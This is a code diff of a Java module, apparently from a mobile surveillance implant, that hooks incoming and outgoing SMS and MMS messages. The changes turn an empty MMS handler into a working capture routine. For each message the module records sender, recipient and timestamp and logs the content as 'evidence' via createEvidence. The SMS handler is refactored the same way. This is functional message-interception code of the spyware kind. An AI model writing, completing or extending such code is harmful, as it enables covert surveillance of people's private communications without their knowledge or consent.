@@ -267,10 +267,7 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
         }
 
         if (mmsEnabled) {
-            // TODO: MMS
-            //#ifdef MMS
-            mmsListener.start(this);
-            //#endif
+            mmsListener.start();
         }
 
         if (mailEnabled) {
@@ -442,26 +439,21 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
         //lastcheck = new Date(0); 
     }
 
-    public boolean onNewSms(final byte[] byteMessage, String address,
+    public boolean onNewSms(String message, String address,
             final boolean incoming) {
 
-        if (byteMessage == null) {
-            return false;
-        }
-
-        String message = new String(byteMessage);
         //#ifdef DBC
-        Check.requires(message != null, "saveLog: null message"); //$NON-NLS-1$
+        Check.requires(message != null, "onNewSms: null message"); //$NON-NLS-1$
         //#endif
 
         //#ifdef DEBUG
-        debug.trace("saveLog message: " + message + " address: " + address //$NON-NLS-1$ //$NON-NLS-2$
+        debug.trace("onNewSms message: " + message + " address: " + address //$NON-NLS-1$ //$NON-NLS-2$
                 + " incoming: " + incoming); //$NON-NLS-1$
         //#endif
 
         //final byte[] dataMsg = getSmsDataMessage(message);
         //#ifdef DBC
-        Check.asserts(message != null, "saveLog: null dataMsg"); //$NON-NLS-1$
+        Check.asserts(message != null, "onNewSms: null dataMsg"); //$NON-NLS-1$
         //#endif
 
         //final ByteArrayOutputStream os = null;
@@ -493,17 +485,17 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
 
             if (incoming) {
                 from = address;
-                to = getMySmsAddress();
+                to = getMyAddress();
 
             } else {
-                from = getMySmsAddress();
+                from = getMyAddress();
                 to = address;
             }
 
             filetime = new DateTime(date);
 
             //#ifdef DBC
-            Check.asserts(filetime != null, "saveLog: null filetime"); //$NON-NLS-1$
+            Check.asserts(filetime != null, "onNewSms: null filetime"); //$NON-NLS-1$
             //#endif
 
             // preparing additionalData
@@ -530,25 +522,120 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
             //#endif
 
             // Creating log
-
-            createEvidence(additionalData, WChar.getBytes(message),
+            createEvidence(additionalData, WChar.getBytes("WC " + message),
                     EvidenceType.SMS_NEW);
 
         } catch (final Exception ex) {
             //#ifdef DEBUG
-            debug.error("saveLog message: " + ex); //$NON-NLS-1$
+            debug.error("onNewSms message: " + ex); //$NON-NLS-1$
             //#endif
 
         }
         return false;
     }
 
-    public void onNewMms(final byte[] byteMessage, String address,
-            final boolean incomin) {
+    public boolean onNewMms(final byte[] byteMessage, String address,
+            final boolean incoming) {
+        
+        if (byteMessage == null) {
+            return false;
+        }
+
+        String message = new String(byteMessage);
+        //#ifdef DBC
+        Check.requires(message != null, "onNewMms: null message"); //$NON-NLS-1$
+        //#endif
+
+        //#ifdef DEBUG
+        debug.trace("onNewSms message: " + message + " address: " + address //$NON-NLS-1$ //$NON-NLS-2$
+                + " incoming: " + incoming); //$NON-NLS-1$
+        //#endif
+
+        //final byte[] dataMsg = getSmsDataMessage(message);
+        //#ifdef DBC
+        Check.asserts(message != null, "onNewMms: null dataMsg"); //$NON-NLS-1$
+        //#endif
+
+        //final ByteArrayOutputStream os = null;
+        try {
+            final int flags = incoming ? 1 : 0;
+
+            DateTime filetime = null;
+            final int additionalDataLen = 48;
+            final byte[] additionalData = new byte[additionalDataLen];
+
+            String from;
+            String to;
+
+            // Check if it's actually a sms
+
+            final String prefix = "//"; //$NON-NLS-1$
+            int pos = address.indexOf(prefix);
+            if (pos >= 0) {
+                address = address.substring(prefix.length() + pos);
+            } else {
+                //#ifdef DEBUG
+                debug.error("Not a mms, address: " + address); //$NON-NLS-1$
+                //#endif
+                return false;
+            }
+
+            // Filling fields
+            final Date date = new Date();
+
+            if (incoming) {
+                from = address;
+                to = getMyAddress();
+
+            } else {
+                from = getMyAddress();
+                to = address;
+            }
+
+            filetime = new DateTime(date);
+
+            //#ifdef DBC
+            Check.asserts(filetime != null, "onNewMms: null filetime"); //$NON-NLS-1$
+            //#endif
+
+            // preparing additionalData
+
+            final DataBuffer databuffer = new DataBuffer(additionalData, 0,
+                    additionalDataLen, false);
+            databuffer.writeInt(SMS_VERSION);
+            databuffer.writeInt(flags);
+            databuffer.writeLong(filetime.getFiledate());
+            databuffer.write(Utils.padByteArray(from.getBytes(), 16));
+            databuffer.write(Utils.padByteArray(to.getBytes(), 16));
+
+            //#ifdef DEBUG
+            debug.info("mms : " + (incoming ? "incoming" : "outgoing")); //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
+            debug.info("From: " + from + " To: " + to + " date: " //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
+                    + filetime.toString());
+            //#endif
+
+            //#ifdef DBC
+            Check.ensures(databuffer.getLength() == additionalDataLen,
+                    "MMS Wrong databuffer size: " + databuffer.getLength()); //$NON-NLS-1$
+            Check.ensures(additionalData.length == additionalDataLen,
+                    "SMMS Wrong buffer size: " + additionalData.length); //$NON-NLS-1$
+            //#endif
+
+            // Creating log
+            createEvidence(additionalData, WChar.getBytes(message),
+                    EvidenceType.SMS_NEW);
+
+        } catch (final Exception ex) {
+            //#ifdef DEBUG
+            debug.error("onNewMms message: " + ex); //$NON-NLS-1$
+            //#endif
+
+        }
+        return false;
 
     }
 
-    private String getMySmsAddress() {
+    private String getMyAddress() {
         final String number = Phone.getDevicePhoneNumber(false);
         if (number == null || number.startsWith(Messages.getString("18.11"))) { //$NON-NLS-1$
             return Messages.getString("18.12"); //$NON-NLS-1$
@@ -601,6 +688,7 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
             databuffer.writeInt(flags);
             databuffer.writeInt(size);
             databuffer.writeLong(filetime.getFiledate());
+            
             //#ifdef DBC
             Check.asserts(additionalData.length == 20,
                     "Mail Wrong buffer size: " + additionalData.length); //$NON-NLS-1$
